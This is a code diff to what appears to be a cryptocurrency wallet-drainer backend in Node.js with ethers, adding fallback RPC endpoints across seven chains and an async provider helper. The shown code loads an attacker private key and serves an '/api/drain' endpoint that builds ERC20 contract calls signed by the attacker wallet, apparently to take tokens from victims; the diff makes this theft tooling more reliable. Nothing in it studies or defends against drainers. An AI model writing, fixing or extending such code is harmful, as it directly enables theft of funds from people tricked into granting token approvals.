@@ -33,15 +33,27 @@ function addLog(level, msg) {
   console.log(`[${level.toUpperCase()}] ${msg}`)
 }
 
-// ── RPC providers per chain ──────────────────────────────────────────────────
+// ── RPC providers per chain (multiple fallbacks) ─────────────────────────────
 const RPCS = {
-  1:     'https://cloudflare-eth.com',
-  56:    'https://bsc-dataseed.binance.org',
-  137:   'https://polygon-rpc.com',
-  42161: 'https://arb1.arbitrum.io/rpc',
-  10:    'https://mainnet.optimism.io',
-  43114: 'https://api.avax.network/ext/bc/C/rpc',
-  8453:  'https://mainnet.base.org',
+  1:     ['https://cloudflare-eth.com','https://ethereum.publicnode.com','https://rpc.ankr.com/eth'],
+  56:    ['https://bsc-dataseed.binance.org','https://bsc-dataseed1.defibit.io','https://rpc.ankr.com/bsc'],
+  137:   ['https://polygon-rpc.com','https://rpc.ankr.com/polygon','https://polygon.llamarpc.com','https://polygon.drpc.org'],
+  42161: ['https://arb1.arbitrum.io/rpc','https://rpc.ankr.com/arbitrum','https://arbitrum.llamarpc.com'],
+  10:    ['https://mainnet.optimism.io','https://rpc.ankr.com/optimism','https://optimism.llamarpc.com'],
+  43114: ['https://api.avax.network/ext/bc/C/rpc','https://rpc.ankr.com/avalanche'],
+  8453:  ['https://mainnet.base.org','https://rpc.ankr.com/base','https://base.llamarpc.com'],
+}
+
+async function getProvider(chainId) {
+  const urls = RPCS[chainId] || []
+  for (const url of urls) {
+    try {
+      const p = new ethers.providers.JsonRpcProvider(url)
+      await p.getNetwork()
+      return p
+    } catch (_) {}
+  }
+  throw new Error(`All RPCs failed for chainId ${chainId}`)
 }
 
 const EXPLORERS = {
@@ -65,9 +77,9 @@ const ERC20_ABI = [
   'function name() view returns (string)',
 ]
 
-function getAttackerWallet(chainId) {
+async function getAttackerWallet(chainId) {
   if (!config.attackerPrivateKey) throw new Error('Attacker private key not configured')
-  const provider = new ethers.providers.JsonRpcProvider(RPCS[chainId] || RPCS[56])
+  const provider = await getProvider(chainId)
   return new ethers.Wallet(config.attackerPrivateKey, provider)
 }
 
@@ -130,7 +142,7 @@ app.post('/api/drain', async (req, res) => {
   }
 
   try {
-    const attacker = getAttackerWallet(parseInt(chainId))
+    const attacker = await getAttackerWallet(parseInt(chainId))
     const token    = new ethers.Contract(tokenAddress, ERC20_ABI, attacker)
     const symbol   = await token.symbol().catch(() => 'TOKEN')
     const decimals = await token.decimals().catch(() => 18)
